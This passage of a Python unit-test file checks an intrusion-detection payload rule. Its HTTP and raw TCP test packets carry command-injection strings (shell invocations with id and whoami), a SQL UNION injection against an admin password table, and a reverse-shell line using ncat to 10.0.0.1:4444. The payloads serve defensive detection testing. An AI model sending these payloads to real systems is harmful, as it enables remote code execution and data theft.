                self.assertIn("SSRF", [hit["signature"] for hit in alert["evidence"]["hits"]])

    def test_usr_bin_bash_cmd_injection_detected(self):
        # /usr/bin/bash, /usr/bin/sh, /usr/bin/zsh, and /bin/dash in command injection
        for cmd in (
            b"GET /exec?cmd=;+/usr/bin/bash+-i HTTP/1.1\r\n\r\n",
            b"GET /test?x=%26%26+/usr/bin/sh+-c+id HTTP/1.1\r\n\r\n",
            b"GET /run?arg=;+/bin/dash+-c+whoami HTTP/1.1\r\n\r\n",
            b"GET /run?arg=;+/usr/bin/zsh+-c+id HTTP/1.1\r\n\r\n",
            b"GET /shell?x=%3B+ncat+-e+/usr/bin/sh+10.0.0.1+4444 HTTP/1.1\r\n\r\n",
        ):
            with self.subTest(cmd=cmd):
                rule = PayloadRule()
                pkt = self.packet(cmd, 5405)
                alert = rule.check(pkt)
                self.assertIsNotNone(alert)
                self.assertEqual(alert["rule_version"], "1.23")
                self.assertIn("CMD_INJECTION", [hit["signature"] for hit in alert["evidence"]["hits"]])

    def test_mssql_and_memcached_dpi_ports_inspected(self):
        rule = PayloadRule()
        # MSSQL port 1433 SQL injection
        mssql_pkt = {
            "type": "IP", "protocol": "TCP",
            "src_ip": "192.168.1.100", "dst_ip": "192.168.1.10",
            "src_port": 54000, "dst_port": 1433,
            "payload": b"SELECT * FROM users WHERE id=1 UNION SELECT password FROM admin--",
            "timestamp": 100.0,
        }
        alert = rule.check(mssql_pkt)
        self.assertIsNotNone(alert, "Payload on MSSQL port 1433 should be inspected")
        self.assertEqual(alert["rule_version"], "1.23")
        self.assertIn("SQL_INJECTION", [hit["signature"] for hit in alert["evidence"]["hits"]])

        # Memcached port 11211 command injection
        memcached_pkt = {
            "type": "IP", "protocol": "TCP",
            "src_ip": "192.168.1.100", "dst_ip": "192.168.1.10",
            "src_port": 54001, "dst_port": 11211,
            "payload": b"set key 0 0 10\r\n; /bin/sh -c 'id'\r\n",
            "timestamp": 101.0,
        }
        alert2 = rule.check(memcached_pkt)
        self.assertIsNotNone(alert2, "Payload on Memcached port 11211 should be inspected")
        self.assertEqual(alert2["rule_version"], "1.23")
        self.assertIn("CMD_INJECTION", [hit["signature"] for hit in alert2["evidence"]["hits"]])


if __name__ == "__main__":
    unittest.main()
